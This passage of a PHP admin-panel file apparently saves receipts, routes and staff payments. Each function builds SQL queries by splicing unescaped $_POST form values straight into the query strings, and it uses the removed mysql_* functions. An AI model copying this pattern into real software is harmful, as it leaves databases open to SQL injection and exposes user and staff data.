		$mes = $_POST["listMes"];
		$anho = $_POST["listAnho"];
		$comp = $_POST["listTipoComp"];
		$desc = $_POST["textDescripcion"];
		$dep = $_POST["listDepartamento"];
		$prov = $_POST["listProvincia"];
		$ciud = $_POST["listCiudad"];
		
		unset($_POST["textRuc"]);
		unset($_POST["textRazonSocial"]);
		unset($_POST["textNumero"]);
		unset($_POST["textSerie"]);
		unset($_POST["textMonto"]);
		unset($_POST["listDia"]);
		unset($_POST["listMes"]);
		unset($_POST["listAnho"]);
		unset($_POST["listTipoComp"]);
		unset($_POST["textDescripcion"]);
		unset($_POST["listDepartamento"]);
		unset($_POST["listProvincia"]);
		unset($_POST["listCiudad"]);
		
		$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
		$bd->conectar();
		
		$consulta = "select Clave from ciudad where Departamento='$dep' and Provincia='$prov' and Distrito='$ciud';";
		$result = $bd->crearConsulta($consulta);
		$reg = mysql_fetch_object($result);
		$claveCiud = $reg->Clave;		
		
		$consulta = "insert into comprobantecompra(RUC, razonSocial, numero, serie, monto, fecha, tipoComprobante, descripcion, activo, Ciudad_Clave, usuario) values('$ruc', '$razSocial', '$numero', '$serie', '$monto', ".$anho.$mes.$dia.", '$comp', '$desc', 1, '$claveCiud', '".$_SESSION["usuario"]."');";
		$bd->crearConsulta($consulta);
		$bd->cerrarConexion();		
		header("Location: administrador.php");
	}	
	
	function guardarRuta()
	{
		$origen = $_POST["listDistritoO"];
		$destino = $_POST["listDistritoD"];
		
		$consulta = "insert into ruta (CiudadOrigen, CiudadDestino, Nombre, activo, usuario) values ('$origen', '$destino', '".$origen." - ".$destino."', 1, '".$_SESSION["usuario"]."');";
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();
		$bd->crearConsulta($consulta);
		
		$clave = mysql_insert_id();
		
		$bd->cerrarConexion();		
		header("Location: formInsCiudadRuta.php?origen=$origen&destino=$destino&clave=$clave");
		die;
		/*?>
		<script language="javascript" type="text/javascript">
			alert("¡ Ruta guardada correctamente !");
			location.href="formInsCiudadRuta.php";
		</script>
		<?php*/
	}
	
	function guardarDescuento()
	{
		$dni = $_POST["textDNI"];
		$monto = $_POST["textMonto"];
		$monto = number_format($monto, 2, '.', '');
		$motivo = $_POST["textMotivo"];
		
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();
		$consulta = "insert into descuentopersonal (monto, fecha, motivo, activo, Trabajador_DNI, usuario) values ('$monto', '".date('Y-m-d')."','$motivo', '1', '$dni', '".$_SESSION["usuario"]."');";		
		$bd->crearConsulta($consulta);
		$bd->cerrarConexion();
		?>
		<script language="javascript" type="text/javascript">
			alert("Exito en el descuento");
			location.href="administrador.php";
		</script>
		<?php
	}
	
	function guardarPagoPersonal()
	{
		$dni = $_POST["textDNI"];
		$monto = $_POST["textMonto"];
		$monto = number_format($monto, 2, '.', '');
		$tipoPago = $_POST["listTipoPago"];
		
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();
		$consulta = "insert into pagopersonal (monto, fecha, tipoPago, activo, Trabajador_DNI, usuario) values ('$monto', '".date('Y-m-d')."','$tipoPago', '1', '$dni', '".$_SESSION["usuario"]."');";		
		$bd->crearConsulta($consulta);
		$bd->cerrarConexion();
		?>
		<script language="javascript" type="text/javascript">
			alert("¡ Exito en el pago !");
			location.href="administrador.php";
		</script>
		<?php
	}
?>